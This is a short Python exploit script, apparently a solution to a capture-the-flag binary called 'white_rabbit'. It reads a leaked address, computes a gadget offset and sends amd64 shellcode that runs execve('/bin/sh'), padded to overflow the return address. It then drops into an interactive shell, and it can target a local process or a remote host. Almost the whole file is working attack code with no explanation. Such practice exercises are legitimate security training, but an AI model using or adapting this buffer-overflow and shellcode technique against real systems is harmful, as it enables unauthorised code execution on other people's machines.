#!/usr/bin/python3
from pwncus import *

context.log_level = 'debug'
exe = context.binary = ELF('./white_rabbit', checksec=False)
def GDB(): gdb.attach(p, gdbscript='''


c
''') if not args.REMOTE else None

p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

ru(b'/ > ')
leak = int(rl()[:-1], 16)
info("Leak: " + hex(leak))

gadget = leak - 0xc1
shellcode = asm("""
    push 0x3b
    pop rax

    mov rdi, 0x68732f6e69622f
    push rdi
    push rsp
    pop rdi

    cdq
    push rdx
    pop rsi

    syscall
""", arch="amd64")

pl = flat(
    shellcode.ljust(120, b'A'),
    p64(gadget)
    )

sl(pl)
interactive()
